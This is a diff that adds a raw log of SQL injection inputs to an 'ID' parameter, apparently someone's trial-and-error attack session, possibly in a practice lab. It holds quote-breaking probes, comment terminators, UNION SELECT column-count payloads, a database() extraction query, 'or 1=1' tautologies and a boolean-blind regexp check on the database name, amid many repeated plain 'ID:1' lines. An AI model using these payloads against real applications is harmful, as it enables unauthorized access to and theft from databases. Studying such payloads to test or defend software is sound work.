@@ -1,0 +1,134 @@
+ID:1
+ID:1
+ID:1]
+ID:1]
+ID:1]
+ID:1\
+ID:1'
+ID:1'
+ID:1\
+ID:1' -- 
+ID:1' 
+ID:1'  
+ID:1'  --
+ID:1'  --
+ID:1'  -- 
+ID:1' union select 1,database(),3 -- 
+ID:0' union select 1,database(),3 -- 
+ID:0' union select 1,database(),3 
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1‘ union select 1,2,3 #
+ID:1‘ union select 1,2,3 #
+ID:-1‘ union select 1,2,3 #
+ID:-1‘ union select 1,2,3 #
+ID:-1‘ union select 1,2,3 -- 
+ID:-1‘ union select 1,2,3 -- 
+ID:-1‘ union select 1,2,3 -- 
+ID:-1‘ union select 1,2,3 -- 
+ID:-1‘ union select 1,2,3 -- 
+ID:-1‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3 -- 
+ID:0‘ union select 1,2,3  -- 
+ID:0‘ union select 1,2,3
+ID:0’ union select 1,2,3
+ID:1
+ID:1'
+ID:1' union  select 1,2,3 -- 
+ID:-1' union  select 1,2,3 -- 
+ID:-1' union  select 1,2,3 #
+ID:-1' union  select 1,2,3 #
+ID:-1' union  select 1,2,3 #
+ID:-1' union  select 1,2,3 
+ID:-1' union  select 1,2,3 #
+ID:1
+ID:1\
+ID:1' union  select 1,2,3 -- 
+ID:1' union  select 1,2,3 #
+ID:-1' union  select 1,2,3 #
+ID:1'
+ID:1 -- 
+ID:1 union select 1,2,3 -- 
+ID:-1 union select 1,2,3 -- 
+ID:-1' union select 1,2,3 -- 
+ID:1\
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1' -- 
+ID:1' or 1==1 -- 
+ID:1' or 1=1 -- 
+ID:100' -- 
+ID:100' or 1=1 -- 
+ID:1' and database() regexp '[a-z]' -- 
+ID:1' and database() regexp '[a-z]' -- 
+ID:1' --
+ID:1\
+ID:1' -- 
+ID:1' --
+ID:1' -- 
+ID:1'; -- 
+ID:1' union select 1,2,3 ; -- 
+ID:0' union select 1,2,3 ; -- 
